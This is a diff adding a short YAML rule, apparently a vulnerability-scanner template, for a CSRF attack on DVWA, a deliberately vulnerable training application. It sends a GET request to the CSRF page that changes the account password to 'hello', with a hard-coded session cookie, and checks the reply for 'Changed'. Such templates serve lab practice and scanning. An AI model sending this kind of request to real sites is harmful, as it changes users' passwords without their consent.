@@ -1,0 +1,15 @@
+name: csrf-dvwa-get
+type: CSRF
+rules:
+  - method: GET
+    path: index.php
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+      Cookie: PHPSESSID=saispaep1njotu2krebplo8po3; security=low
+    expression: result.contains("")
+  - method: GET
+    path: vulnerabilities/csrf/?password_new=hello&password_conf=hello&Change=Change#
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101
+    expression: result.contains("Changed")
+author: ch4ser
